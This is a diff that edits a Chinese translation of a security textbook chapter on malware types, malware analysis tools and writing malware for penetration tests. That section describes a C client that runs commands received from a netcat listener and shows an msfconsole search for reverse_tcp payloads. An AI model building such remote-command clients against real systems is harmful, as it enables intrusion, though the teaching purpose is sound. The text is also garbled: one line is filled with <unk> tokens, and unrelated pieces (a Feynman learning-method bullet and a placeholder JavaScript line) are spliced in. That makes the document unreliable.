 A Trojan 是一种真正的恶意软件，通常是病毒。它的特点是它看起来像它不是。虽然它可能已经很出名，但它的名字来源于所谓的特洛伊木马。故事是这样的：希腊人在与特洛伊人的战争中，制造了一个木马作为“礼物”送给特洛伊人。木马里面藏着希腊人。它并不是一座木制的马像，而是一个用来运送希腊士兵的载体，这些士兵在夜晚潜出木马，从内部攻击特洛伊城。
 
 同理，被称为 Trojan 的恶意软件看起来像是无害的，往往是你以为自己认识的东西。实际上，它会感染你的系统。因为它依赖用户的参与 —  — 用户以为自己在运行一个非恶意软件的程序，实际上却在执行恶意软件，特洛伊木马通常是一种病毒。它感染你的系统，需要用户参与，是一种恶意软件，也就是病毒。你可以把它看作一种社交工程，用户被骗执行恶意软件，因为他们误以为它是别的东西。
@@ -7480,36 +8436,33 @@ A Trojan 是一种真正的恶意软件，通常是病毒。它的特点是它�
 
 ### Botnet
 
-Botnet 可能是病毒或蠕虫的负载，也可能是特洛伊木马安装的。提到 *botnet* 时，实际上是指被安装的 botnet 客户端。Botnet 是某一类恶意软件感染端点的整体集合。客户端是一段小型软件，其作用是连接到命令与控制基础设施（C&C 或 C2）。我们稍后在“Malware Infrastructure”章节中会更深入地介绍该基础设施。客户端从 C&C 基础设施接收指令。Botnet 可以用于多种目的，但其主要目的是为所有者创造收入。客户端的作用是促进这一过程。
+Botnet 可能是病毒或蠕虫的负载，也可能是特洛伊木马安装的。提到 `botnet` 时，实际上是指被安装的 botnet 客户端。Botnet 是某一类恶意软件感染端点的整体集合。客户端是一段小型软件，其作用是连接到命令与控制基础设施（C&C 或 C2）。我们稍后在“Malware Infrastructure”章节中会更深入地介绍该基础设施。客户端从 C&C 基础设施接收指令。Botnet 可以用于多种目的，但其主要目的是为所有者创造收入。客户端的作用是促进这一过程。
 
-一些现代 botnet 采用去中心化模型来管理。与传统的客户端‑服务器模型不同，去中心化 botnet 完全采用点对点（P2P）结构。消息可以直接从一个端点发送到另一个端点。所有路由均在 botnet 内部完成，类似于其他 P2P 网络。虽然 bot herder（bot  herder）仍然掌控，但没有专门的基础设施网络可以被攻击或关闭。
+一些现代 botnet 采用去中心化模型来管理。与传统的客户端‑服务器模型不同，去中心化 botnet 完全采用点对点（P2P）结构。消息可以直接从一个端点发送到另一个端点。所有路由均在 botnet 内部完成，类似于其他 P2P 网络。虽然 bot herder（bot herder）仍然掌控，但没有专门的基础设施网络可以被攻击或关闭。
 
 ### Ransomware
 
 勒索软件（Ransomware）是另一种恶意软件。勒索软件的目标是向受害者索要金钱。勒索软件是一款会加密受害者硬盘一部分的程序，其中包括个人文件，甚至在某些情况下是重要的商业文档。攻击者会提供受害者汇款的指示，通常要求使用比特币等加密货币。其背后的思路是：攻击者在收到赎金后会提供解密密钥，受害者使用该密钥即可恢复宝贵数据。通常会设定一个时间限制，以增加对受害者的压力。
 
-已有多个著名且毁灭性的勒索软件案例。最早且最知名的勒索软件家族之一是 **WannaCry**。它感染了全球数十万台系统，原因是用户未及时打补丁。图 8.2（链接）展示了如果你的系统被 WannaCry 感染时会收到的消息。幸运的是，微软的快速响应以及安全研究人员的努力，限制了全球受影响的设备数量。尽管如此，估计其造成的经济损失从数百万美元到数十亿美元不等。
+已有多个著名且毁灭性的勒索软件案例。最早且最知名的勒索软件家族之一是 `WannaCry`。它感染了全球数十万台系统，原因是用户未及时打补丁。图 8.2（链接）展示了如果你的系统被 WannaCry 感染时会收到的消息。幸运的是，微软的快速响应以及安全研究人员的努力，限制了全球受影响的设备数量。尽管如此，估计其造成的经济损失从数百万美元到数十亿美元不等。
 
 ![FIGURE 8.2 WannaCry ransom demand](img/c08f002.png)
 
 **FIGURE 8.2** WannaCry 勒索要求
 
-WannaCry 通过美国国家安全局（NSA）开发的漏洞 —  — 称为 **Eternal Blue** —  — 进行传播。该漏洞是“Shadow Brokers”组织获得的，该组织入侵了 NSA 并公开了该机构用于网络安全和网络战争的工具和战术。该信息公开后不久，WannaCry 开始快速传播。
+WannaCry 通过美国国家安全局（NSA）开发的漏洞 —  — 称为 `Eternal Blue` —  — 进行传播。该漏洞是“Shadow Brokers”组织获得的，该组织入侵了 NSA 并公开了该机构用于网络安全和网络战争的工具和战术。该信息公开后不久，WannaCry 开始快速传播。
 
-虽然 WannaCry 肯定是勒索软件，但这仅描述了它的功能，而不涉及它的传播方式。它是病毒还是蠕虫？由于它利用远程漏洞自动感染其他系统，能够自行传播，因此它属于蠕虫。这是一个例子，说明同一段恶意软件可以同时被归类到多个类别。WannaCry 是一款 **勒索软件蠕虫**。
+虽然 WannaCry 肯定是勒索软件，但这仅描述了它的功能，而不涉及它的传播方式。它是病毒还是蠕虫？由于它利用远程漏洞自动感染其他系统，能够自行传播，因此它属于蠕虫。这是一个例子，说明同一段恶意软件可以同时被归类到多个类别。WannaCry 是一款 `勒索软件蠕虫`。
 
 近年来，勒索软件呈上升趋势。攻击者发现，直接索要金钱比窃取信息并利用信息更为高效。传统上，威胁组织分为三类：
 
-*   **情报驱动组织** —  — 有时也被称为 *国家行为体*。这些组织旨在获取诸如公司的知识产权等信息，以提升国家赞助企业的市场竞争力。
+*   `情报驱动组织` —  — 有时也被称为 `国家行为体`。这些组织旨在获取诸如公司的知识产权等信息，以提升国家赞助企业的市场竞争力。
 
-*   **犯罪组织** —  — 这些组织只为金钱而活。它们是有组织的企业，拥有雇员和工作时间，员工拥有各自的角色和职责，正如你在常规工作中所见。
+*   `犯罪组织` —  — 这些组织只为金钱而活。它们是有组织的企业，拥有雇员和工作时间，员工拥有各自的角色和职责，正如你在常规工作中所见。
 
-*   **黑客活动家（Hacktivists）** —  — 这些人只是想制造轰动，表达观点。他们会进行各种行动，如篡改网页或发起分布式拒绝服务攻击。
+*   `黑客活动家（Hacktivists）` —  — 这些人只是想制造轰动，表达观点。他们会进行各种行动，如篡改网页或发起分布式拒绝服务攻击。
 
-有时，国家行为体也会参与 financially motivated（经济动机）的犯罪，以获取资金支持持续运营。自 2020 年起，特别是从那时起，那些原本关注知识产权的国家行为体开始转向勒索软件攻击，因为其盈利性极高。尽管美国财政部海外资产控制办公室（OFAC）发布警告称会对支付勒索软件的公司进行处罚，企业仍然支付赎金，因为这比恢复成本更具成本效益，即使公司拥有完善的备份基础设施和流程。此外，保险公司也可能在公司的授权下支付赎金，因为对保险公司而言，支付赎金的成本低于承担传统恢复的费用。
-
-
-
+有时，国家行为体也会参与 `financially motivated`（经济动机）的犯罪，以获取资金支持持续运营。自 2020 年起，特别是从那时起，那些原本关注知识产权的国家行为体开始转向勒索软件攻击，因为其盈利性极高。尽管美国财政部海外资产控制办公室（OFAC）发布警告称会对支付勒索软件的公司进行处罚，企业仍然支付赎金，因为这比恢复成本更具成本效益，即使公司拥有完善的备份基础设施和流程。此外，保险公司也可能在公司的授权下支付赎金，因为对保险公司而言，支付赎金的成本低于承担传统恢复的费用。
 
 -   `Maze` 是 2019 年开始攻击公司的恶意软件家族之一，并在 2020 年初获得势头。当 `Maze` 加密系统上的文件时，恶意软件会在受害者电脑桌面的背景上留下一张图片，提供支付详情。其他勒索软件会在某个位置留下文本文档，供受害者找到并收到勒索要求。常见的要求是支付比特币，但也可能使用其他加密货币（通过密码学技术保护并实现匿名的数字货币）。
 
@@ -7545,18 +8498,13 @@ WannaCry 通过美国国家安全局（NSA）开发的漏洞 —  — 称为 **E
 
 -   在进行分析之前，您需要了解我们将使用多种工具进行分析。与其单独下载并安装每个工具不同，使用一个一次性安装所有工具的包会更便捷。本次我们不使用 Kali。我们将使用基于 Windows 的工具。这里存在一定风险。大多数恶意软件是针对 Windows 系统编写的，因为它是桌面平台的主流，也是最易受社交工程攻击的对象。若您处理的是针对 Windows 的恶意软件，请格外小心，任何失误都可能导致系统被入侵。
 
+-   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 `Richard Feynman`。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1.  运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 -   Figure 8.4 显示了不同的章节及其大小。通常，`.text` 章节会是最大的。这在 Figure 8.4 中已有说明。对于任何打包或加密的程序，位于 `.text` 章节的桩程序会相对较小，而 `.data` 章节会较大。虽然 Cutter 是分析可执行文件的非常通用的工具，但它不识别打包的可执行文件。对于这种情况，我们可以转向其他程序，例如 PE Detective。PE Detective 的一个优势是可以扫描整个目录以识别程序。在 Figure 8.5 中，你可以看到一个目录中恶意软件的输出。你会看到其中有一些使用了不同的打包工具。常见的打包工具有 UPX，这里就使用了它。
 
@@ -7573,6 +8521,8 @@ if (condVar > someVal) {console.log("xxx")}
 在 Figure 8.6 的顶部有一个函数标识符。这是指向内存某处的标签。可以看到标识符是 `UPX1:entry0`。这表明程序使用了 `UPX1` 进行打包，而 `entry0` 是解压桩代码的标签。`entry0` 标签指示程序的入口点。当然，你可能会遇到没有像这样明确指示器的压缩可执行文件。UPX 仍然是最流行且常用的可执行文件压缩工具之一。
 
 #### Disassembly
+
+
 
 在不运行程序的情况下，观察程序将要做什么的最有效方法是查看代码。我们无法查看源代码，但可以对可执行文件进行反汇编。反汇编的过程是将 CPU 理解的操作码（opcodes）形式的可执行代码转换为人类更易理解的汇编语言。当然，汇编语言并不是最易阅读的语言。最好的情况是，它比单纯的数字更易理解。反汇编会将操作码转换为助记符（mnemonic）。助记符是一种记忆辅助技术。通常你会看到一句话，其每个单词的首字母对应需要记住的内容。这是一种助记符的形式。在我们的例子中，每条指令用三到四个字母表示其功能。
 
@@ -7594,19 +8544,17 @@ if (condVar > someVal) {console.log("xxx")}
 
 通过跟踪代码进行静态分析是耗时的，尤其是当你不想运行程序时。运行潜在的恶意软件样本是危险的。你可能会损坏系统上的文件，或者感染网络中的其他系统。如前所述，静态分析耗时且需要对不同操作码行为有扎实的理解。
 
-#### Properties
+## Properties
 
 除了查看程序文件内部，我们还可以查看与其相关的元数据。例如，编译日期和时间。一些数据不仅特定于可执行文件，而且适用于所有文件。获取文件属性可以显示创建、访问和修改的日期和时间。这可能会给你关于恶意软件以及系统上发生了什么的信息。当你查看可执行文件的属性时，会出现名为“Details”（详细信息）的选项卡。在可执行文件中，你可以看到产品名称、版权信息等。这在 Figure 8.8 中有所体现。
 
-
-
 在这些情况下，并没有为编译器指定任何信息来写入文件。如果你查看系统中的任何文件（例如），你会看到 Microsoft Corporation 作为版权所有者。你还会得到程序的相关信息，可能包括这些信息。这并不意味着恶意软件作者会在文件中写入他们的名称。事实上，你可能会在这里发现虚假信息。软件供应商可以做的一件事是对可执行文件进行签名。这意味着添加一个加密签名。大型供应商，尤其是 Microsoft，会对可执行文件进行签名。即使恶意软件作者在元数据中插入信息，假装文件来自 Microsoft，可执行文件也不会拥有正确的加密签名。你应该能够看到签名不是使用合法 Microsoft 证书生成的。
 
-#### VirusTotal
+## VirusTotal
 
 另一种在不执行程序的情况下进行静态分析的方法是获取样本的哈希值。可以使用多种哈希算法。常见的一个是消息摘要 5（MD5）。这是一种已有数十年历史的哈希算法，广为人知，虽然在某些应用中它并不是最佳选择，因为它可能易受碰撞影响（即两个不同的数据集生成相同的值），但对于恶意软件分析来说，获得文件哈希通常不被认为是问题所在。在下面的示例中，你可以看到在 Windows 系统上运行哈希算法以获得 MD5 值。
 
-**获取 MD5 哈希值**
+### 获取 MD5 哈希值
 
 ```
 C:\Users\kilroy\Documents
@@ -7630,15 +8578,13 @@ Figure 8.9 展示了不同防病毒程序如何识别该样本。在数十个防
 
 **FIGURE 8.10** VirusTotal details
 
-除了这些数据外，“Details”标签还包含关于 PDF 文件被滥用的常见属性以及样本中出现的实例数量的详�>"�<unk><unk><unk><unk><unk><unk><unk><unk> 以及在样本中出现的 EXIF 文件元数据的信息。通过 VirusTotal，<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>: 1000
-
-
+除了这些数据外，“Details”标签还包含关于 PDF 文件被滥用的常见属性以及样本中出现的实例数量的详细信息。通过 VirusTotal，你可以获取关于样本中出现的 EXIF 文件元数据的信息。
 
 而在静态分析的目的在于不运行程序，动态分析则是通过运行程序来观察其行为。虽然可以通过不在系统上感染恶意软件的方式来实现，但这正是动态分析的挑战所在。你需要在不实际感染自己在乎的系统的前提下，观察其行为；同时也不想将其放入仍然具有网络访问权限且可能感染你在乎的网络中其他系统的沙箱中。然而，你需要让恶意软件相信它运行在一个真实的系统上，而不是在沙箱中。
 
 第一种方法是直接在虚拟机（VM）中运行恶意软件。这一方法的优势在于你可以完全控制恶意软件运行的操作系统和硬件，包括在网络接口上设置控制，防止其访问不希望的地方。此外，虚拟机支持快照功能，可将系统恢复到已知的干净状态，从而可以对同一恶意软件在干净系统上多次运行以持续观察其行为。它还允许你比较快照，以便观察清洁系统与运行恶意软件后系统的差异，并可对挂起的虚拟机内存进行分析。
 
-#### Cuckoo Sandbox
+## Cuckoo Sandbox
 
 使用自建的虚拟机环境虽然灵活，但工作量很大。你需要安装操作系统、创建快照，然后才能运行恶意软件。随后还需要比较系统状态。更简便的做法是使用自动化系统，它会自动在虚拟机中运行恶意软件并完成状态比较，最后生成报告。如果你期待类似的自动化报告，那你会高兴地知道它已经存在。
 
@@ -7660,7 +8606,7 @@ Cuckoo Sandbox 是一个自动化恶意软件分析工具。它负责启动虚�
 
 我们将使用默认设置运行样本。运行过程中，状态会定期更新。当恶意软件被执行时，Cuckoo Sandbox 会生成日志供我们查看。以下代码块展示了提交样本的日志内容，记录了 Cuckoo Sandbox 对样本的所有监控和管理细节。
 
-**Cuckoo Sandbox Logs**
+### Cuckoo Sandbox Logs
 
 ```
  2023-01-17 02:54:09,015 [analyzer] DEBUG: Starting analyzer from: C:\tmp3oj4f_
@@ -7683,7 +8629,6 @@ Cuckoo Sandbox 是一个自动化恶意软件分析工具。它负责启动虚�
  2023-01-17 02:54:11,312 [analyzer] INFO: Process with pid 2268 has terminated
  2023-01-17 02:54:11,328 [analyzer] INFO: Process list is empty, terminating analysis.
  2023-01-17 02:54:12,328 [analyzer] INFO: Analysis completed.
- 
 ```
 
 Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可以看到运行信息，其中包括在样本运行期间拍摄的屏幕截图缩略图。此外，还提供了运行统计数据，包括系统运行样本所需的时间。还能看到日志链接，其中我们之前已经查看过一些。这里提供了系统变化的详细信息。运行细节提供了一些信息，屏幕截图可供进一步细节，而日志则更为精细。在分析器日志中可以看到样本创建了文件系统中的文件，并给出了文件的路径和名称。如果样本有网络活动，也会在日志中体现。
@@ -7692,13 +8637,13 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
 
 **FIGURE 8.15** Cuckoo Sandbox results
 
+-   [`Cuckoo Sandbox`](https://example.org) 会将恶意软件的运行风险转移到我们的系统和网络之外，但也会将恶意软件的控制权转移出我们的掌控。有时你想能够实时观察恶意软件到底在做什么，并且在运行时查看其代码。
+
+## 调试
 
 
--   [Cuckoo Sandbox](https://example.org) 会将恶意软件的运行风险转移到我们的系统和网络之外，但也会将恶意软件的控制权转移出我们的掌控。有时你想能够实时观察恶意软件到底在做什么，并且在运行时查看其代码。
 
-### 调试
-
-使用调试器可以让你对样本的运行拥有完整的控制权。当然，这也把可能随恶意软件出现的问题交给了你。调试器提供的控制权可以让你跳过那些极其糟糕的操作。在深入之前，让我们先了解什么是调试器。调试器让开发者能够对程序的运行进行控制，即开发者可以逐行、逐函数地逐步执行程序。在集成开发环境（IDE）中，集成的调试器通常能够让我们逐行、逐函数地查看源代码。然而，在恶意软件分析时，我们并没有这种奢侈 —  — 如果拥有源代码，就不需要做这些。相反，我们会逐指令（opcode）地逐步执行，因为我们查看的是反汇编代码而非源代码。
+使用调试器可以让你对样本的运行拥有完整的控制权。当然，这也把可能随恶意软件出现的问题交给了你。调试器提供的控制权可以让你跳过那些极其糟糕的操作。在深入之前，让我们先了解什么是调试器。调试器让开发者能够对程序的运行进行控制，即开发者可以逐行、逐函数地逐步执行程序。在集成开发环境（IDE）中，集成的调试器通常能够让我们逐行、逐函数地查看源代码。然而，在恶意软件分析时，我们并没有这种奢侈 — — 如果拥有源代码，就不需要做这些。相反，我们会逐指令（`opcode`）地逐步执行，因为我们查看的是反汇编代码而非源代码。
 
 市面上有很多调试器。调试器和反汇编器的“王者”是 `IDA Pro`。你可以使用 `IDA Pro` 在多种处理器架构和操作系统之间进行工作。你可能不需要 `IDA Pro` 所提供的全部功能，因而可以考虑使用 `OllyDbg`、`Immunity Debugger` 或 Microsoft 的 `Windows Debugger`。我们将从使用 `IDA` 的社区版（而非 Pro 版）开始，因为它已经包含我们所需的全部功能。
 
@@ -7706,13 +8651,13 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
 
 `IDA` 加载文件后，会以多种方式呈现反汇编代码。其中一种方式是图形化的函数调用图。该图展示了入口函数以及程序可能走的所有路径，提供了可视化的执行流。对于我们这里的简单且规模不大的程序，该视图并不特别有用；但在拥有多条执行路径的大型程序中，它能够帮助你直观地跟踪不同的执行路径，而无需记忆每一步的细节。Figure 8.17 展示了反汇编程序的初始视图的一部分。
 
-``` 
+```
 ![FIGURE 8.16 New IDA session](img/c08f016.png)
 ```
 
 **FIGURE 8.16** New IDA session
 
-``` 
+```
 ![FIGURE 8.17 IDA view](img/c08f017.png)
 ```
 
@@ -7724,25 +8669,27 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
 
 **FIGURE 8.18** OllyDbg view
 
-如果直接启动程序，它会一直运行到结束，你不会看到任何调试信息。因此，你需要设置断点。断点会在你指定的位置暂停程序执行。为了观察程序从入口点开始的全部行为，你需要定位入口点。一种简便的方法是利用调用栈（call stack）。每当程序调用函数，函数会被压入调用栈，从而可以通过栈来追踪程序的执行路径。打开调用栈窗口（如 Figure 8.19 所示），栈顶的条目即为入口点 —  — 也就是第一个被调用的函数。要获得该地址，你需要先运行程序一次，让它执行到入口点为止；随后记录下入口点的内存地址，右键单击对应指令并通过上下文菜单打开断点选项即可。
+如果直接启动程序，它会一直运行到结束，你不会看到任何调试信息。因此，你需要设置断点。断点会在你指定的位置暂停程序执行。为了观察程序从入口点开始的全部行为，你需要定位入口点。一种简便的方法是利用调用栈（`call stack`）。每当程序调用函数，函数会被压入调用栈，从而可以通过栈来追踪程序的执行路径。打开调用栈窗口（如 Figure 8.19 所示），栈顶的条目即为入口点 — — 也就是第一个被调用的函数。要获得该地址，你需要先运行程序一次，让它执行到入口点为止；随后记录下入口点的内存地址，右键单击对应指令并通过上下文菜单打开断点选项即可。
 
-``` 
+```
 ![FIGURE 8.19 Call stack](img/c08f019.png)
 ```
 
 **FIGURE 8.19** Call stack
 
-断点设置好后，你可以启动程序的运行。程序一启动就会因断点而停止。要继续运行，你可以逐行步进（step‑by‑step），也可以让程序继续运行直至下一个断点或程序结束。逐行步进有几种方式：  
-- **步入（step into）**：进入被调用函数，包括标准库函数，这会导致你在内存中跳转多次。  
+断点设置好后，你可以启动程序的运行。程序一启动就会因断点而停止。要继续运行，你可以逐行步进（step‑by‑step），也可以让程序继续运行直至下一个断点或程序结束。逐行步进有几种方式：
+
+- **步入（step into）**：进入被调用函数，包括标准库函数，这会导致你在内存中跳转多次。
+
 - **步过（step over）**：调用函数并直接停留在当前上下文，不会进入函数内部。
 
 在 Linux 程序中，你常会看到 `int 0x80` 这类指令，它触发中断向量 128（0x80），用于发起系统调用。系统调用是向内核/操作系统发送请求的过程。Windows 环境下虽然也可以直接使用系统调用，但更常见的是通过库函数包装系统调用。这些 API（应用编程接口）使代码更加标准化，也更可能经过优化。
 
-调用库函数的过程相对简单：使用调用指令并传入函数的地址。正如每次创建新栈帧时需要调整栈指针（esp）和指令指针（eip），在调用库函数前也需要做相应的栈指针调整。下面的代码片段展示了两次调用库函数的片段。在调用 `iob_lb0` 之前，栈指针和指令指针被保存，为跳转到新函数做准备。
+调用库函数的过程相对简单：使用调用指令并传入函数的地址。正如每次创建新栈帧时需要调整栈指针（`esp`）和指令指针（`eip`），在调用库函数前也需要做相应的栈指针调整。下面的代码片段展示了两次调用库函数的片段。在调用 `iob_lb0` 之前，栈指针和指令指针被保存，为跳转到新函数做准备。
 
 **调用库函数**
 
-``` 
+```
 |           0x004012e0           sub esp, 0x1c
 |           0x004012e3           mov dword [esp], 1
 |           0x004012ea           call dword sym.imp.msvcrt.dll  set_app_type] ; 0x408198
@@ -7757,9 +8704,7 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
 |           0x00401315           lea esi, [esi]
  \           0x00401319           lea edi, [edi]
  /           0x00401320      (fcn) sym._atexit 6
-``` 
-
-
+```
 
 库函数让程序更易跟踪，因为它们是按名称调用的；由于库有名称且函数带标签，处理器知道跳转到哪块内存空间以及在该空间内的哪个位置。标签即为函数名称，因此你至少可以在不进入函数逐行观察每个操作的情况下，对程序的部分内容有一个把握。
 
@@ -7777,19 +8722,19 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
 
 你可以从很多渠道获取恶意软件样本来进行测试。使用他人的恶意软件的问题在于你可能不完全了解它的全部功能。此外，恶意软件可能在尝试与他人控制的系统通信。在与客户进行测试时，你可能需要使用恶意软件，或者至少使用灰色软件。请记住，你必须遵守伦理准则，这意味着不能使用可能对系统造成损害的真实恶意软件。你的目标可能是在不被发现的情况下保持对系统的访问，也可能是看看能否在不被检测的情况下将恶意软件注入网络并传播到系统上。
 
-如果你想从零开始，有两种主要思路。第一种是自己编写恶意软件，这需要一定的编程能力。第二种则更为容易，利用 Metasploit，因为它已经提供了大量模块，并且可以生成独立的可执行文件。
+如果你想从零开始，有两种主要思路。第一种是自己编写恶意软件，这需要一定的编程能力。第二种则更为容易，利用 `Metasploit`，因为它已经提供了大量模块，并且可以生成独立的可执行文件。
 
 ### Writing Your Own
 
-如果你有编程经验，或者至少愿意大胆尝试并学习，你可以尝试自行创建恶意软件。一种简便的做法是编写一个能够执行你需要的功能的程序。例如，你可以编写一个客户端，使其能够连接到任何 handler 或基于 `netcat` 的监听器。该客户端可以为你提供远程系统访问，这在很多情况下很有用。你需要使用其他攻击手段将程序部署到目标系统上，但一旦部署成功，系统即可被你控制。
+如果你有编程经验，或者至少愿意大胆尝试并学习，你可以尝试自行创建恶意软件。一种简便的做法是编写一个能够执行你需要的功能的程序。例如，你可以编写一个客户端，使其能够连接到任何 `handler` 或基于 `netcat` 的监听器。该客户端可以为你提供远程系统访问，这在很多情况下很有用。你需要使用其他攻击手段将程序部署到目标系统上，但一旦部署成功，系统即可被你控制。
 
-你需要选择一种编程语言来编写恶意软件。选择众多。Python 目前是流行的编程语言，拥有足够的库来支持几乎任何需求。Python 的缺点是需要在运行脚本的系统上安装 Python 解释器。你会发现大多数系统没有预装 Python，虽然可以安装，但通常工作量很大。像 C 这样的语言经过验证，网上有大量源码可供你提取代码片段，组合成可工作的程序。
+你需要选择一种编程语言来编写恶意软件。选择众多。`Python` 目前是流行的编程语言，拥有足够的库来支持几乎任何需求。`Python` 的缺点是需要在运行脚本的系统上安装 `Python` 解释器。你会发现大多数系统没有预装 `Python`，虽然可以安装，但通常工作量很大。像 `C` 这样的语言经过验证，网上有大量源码可供你提取代码片段，组合成可工作的程序。
 
-与 Python 的区别在于 C 是编译语言。在拥有可执行程序之前，你必须先将源代码交给编译器生成程序。最佳做法是使用与目标平台相同的环境进行编译。如果你计划在 Windows 32 位系统上安装该程序，则在 Windows 32 位系统上编译会更为便捷。也有跨平台编译器可以在 Linux 系统上生成 Windows 可执行文件，反之亦然。你甚至可以通过合适的库和编译器管理 32 位与 64 位的差异。
+与 `Python` 的区别在于 `C` 是编译语言。在拥有可执行程序之前，你必须先将源代码交给编译器生成程序。最佳做法是使用与目标平台相同的环境进行编译。如果你计划在 Windows 32 位系统上安装该程序，则在 Windows 32 位系统上编译会更为便捷。也有跨平台编译器可以在 Linux 系统上生成 Windows 可执行文件，反之亦然。你甚至可以通过合适的库和编译器管理 32 位与 64 位的差异。
 
-大多数人会使用微软的 IDE 来构建软件。这些 IDE 适合于你可能要编写的程序，而 Visual Studio 更侧重于利用 Windows API 的程序，而非仅使用标准 C 库。还有其他选项。MinGW（Minimal GNU 环境）为 Windows 提供编译器，你也可以直接获取完整的 GNU 工具链。
+大多数人会使用微软的 IDE 来构建软件。这些 IDE 适合于你可能要编写的程序，而 `Visual Studio` 更侧重于利用 Windows API 的程序，而非仅使用标准 C 库。还有其他选项。`MinGW`（Minimal GNU 环境）为 Windows 提供编译器，你也可以直接获取完整的 GNU 工具链。
 
-下面的代码片段是一个功能极简的程序，用于建立连接到目标系统。在远程系统上，你可以仅运行一个 `netcat` 监听器，或自行编写专门的监听程序。你也可以使用 Metasploit 之类的框架中的 handler。这里展示的程序在 Linux 系统上编译并测试，能够连接到指定的 IP 地址。硬编码 IP 地址的写法虽然不符合最佳实践，但可以最大限度地减少与你试图渗透的系统之间的交互。处理 IP 地址的更好方式是通过命令行参数或配置文件传递，避免任何用户交互。因此，你应事先知晓目标 IP，将其写入代码，编译程序后直接发送。
+下面的代码片段是一个功能极简的程序，用于建立连接到目标系统。在远程系统上，你可以仅运行一个 `netcat` 监听器，或自行编写专门的监听程序。你也可以使用 `Metasploit` 之类的框架中的 `handler`。这里展示的程序在 Linux 系统上编译并测试，能够连接到指定的 IP 地址。硬编码 IP 地址的写法虽然不符合最佳实践，但可以最大限度地减少与你试图渗透的系统之间的交互。处理 IP 地址的更好方式是通过命令行参数或配置文件传递，避免任何用户交互。因此，你应事先知晓目标 IP，将其写入代码，编译程序后直接发送。
 
 **`malclient.c` 程序**
 
@@ -7847,71 +8792,74 @@ Cuckoo Sandbox 在运行时会拍摄屏幕截图。在 Figure 8.15 中，你可�
  
      return 0;
  }
- 
 ```
 
-主函数负责创建用于连接到服务器的套接字。套接字是伯克利加州大学（UCB）作为 AT&T UNIX 的再创作所引入的数据结构和处理机制，用于通过 TCP/IP 及相关协议与其他系统交互。套接字创建并连接后，程序向服务器发送一条消息，然后等待响应。收到响应后，它将字符串传递给 `system()` 函数，使操作系统像用户在命令行中输入那样执行该字符串。 
+主函数负责创建用于连接到服务器的套接字。套接字是伯克利加州大学（UCB）作为 AT&T UNIX 的再创作所引入的数据结构和处理机制，用于通过 TCP/IP 及相关协议与其他系统交互。套接字创建并连接后，程序向服务器发送一条消息，然后等待响应。收到响应后，它将字符串传递给 `system()` 函数，使操作系统像用户在命令行中输入那样执行该字符串。
 
-
-
-
--   [正如前面所指出的，这是一个基础程序。首先，它只需要一个命令即可结束程序。此外，`system()` 调用仅在客户端上运行命令，没有任何命令牌输出被重定向到服务器。为了获取这些输入，程序应该使用类似 `popen()` 的方法，它会打开一个进程并将传递的字符串作为要运行的进程。这也可以让你启动任何新进程并捕获输出，以便将其发送回服务器端。
+- [正如前面所指出的，这是一个基础程序。首先，它只需要一个命令即可结束程序。此外，`system()` 调用仅在客户端上运行命令，没有任何命令牌输出被重定向到服务器。为了获取这些输入，程序应该使用类似 `popen()` 的方法，它会打开一个进程并将传递的字符串作为要运行的进程。这也可以让你启动任何新进程并捕获输出，以便将其发送回服务器端。
 
 ### 使用 Metasploit
 
-也许更简单的方法是使用 Metasploit。这样你就不必担心 CPU 架构和编译器，也不必对程序进行任何自定义并重新编译。Metasploit 让你可以将其提供的任何模块打包成可执行文件。为了我们的目的，我们将查找能够建立反向连接的负载。该反向连接应能够连回我们已打开的服务器。
+也许更简单的方法是使用 `Metasploit`。这样你就不必担心 CPU 架构和编译器，也不必对程序进行任何自定义并重新编译。`Metasploit` 让你可以将其提供的任何模块打包成可执行文件。为了我们的目的，我们将查找能够建立反向连接的负载。该反向连接应能够连回我们已打开的服务器。
 
-我们需要寻找能够匹配我们在服务器端计划执行操作的负载。如果我们要使用 `netcat` 打开端口，则不能使用类似 Meterpreter 的负载，因为它需要 Meterpreter 处理器，必须在 Metasploit 中运行该处理器。如果我们想使用 `netcat` 作为服务器，则可以使用反向 shell 负载。要找到合适的负载，可以在 `msfconsole` 内进行搜索。下面的列表展示了在 `msfconsole` 中搜索 Windows 32 位架构负载的示例，我们正在寻找反向 TCP 负载。结果数量很多，这里只展示了其中的一部分。
+我们需要寻找能够匹配我们在服务器端计划执行操作的负载。如果我们要使用 `netcat` 打开端口，则不能使用类似 `Meterpreter` 的负载，因为它需要 `Meterpreter` 处理器，必须在 `Metasploit` 中运行该处理器。如果我们想使用 `netcat` 作为服务器，则可以使用反向 shell 负载。要找到合适的负载，可以在 `msfconsole` 内进行搜索。下面的列表展示了在 `msfconsole` 中搜索 Windows 32 位架构负载的示例，我们正在寻找反向 TCP 负载。结果数量很多，这里只展示了其中的一部分。
 
 **Searching for Payloads**
 
+```
+msf6> search arch:x86 platform:windows reverse_tcp
 
-
-  
- msf6> search arch:x86 platform:windows reverse_tcp
-  
  匹配模块
+
  ================
-  
+
